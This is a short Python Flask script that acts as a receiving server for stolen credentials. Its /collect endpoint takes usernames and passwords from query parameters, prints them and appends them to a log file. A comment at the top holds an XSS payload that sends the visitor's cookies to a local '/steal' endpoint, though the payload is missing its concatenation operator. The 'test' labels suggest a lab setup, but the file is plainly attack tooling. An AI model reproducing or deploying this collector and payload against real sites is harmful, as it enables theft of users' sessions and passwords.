# <script>new Image().src='http://127.0.0.1:8000/steal?cookie=' document.cookie;</script>

from flask import Flask, request

app = Flask(__name__)

@app.route('/collect')
def collect():
    user = request.args.get('username')
    pwd  = request.args.get('password')
    print(f"Received test data -> username: {user}, password: {pwd}")
    with open('collected_test_log.txt', 'a') as f:
        f.write(f"{user}\t{pwd}\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
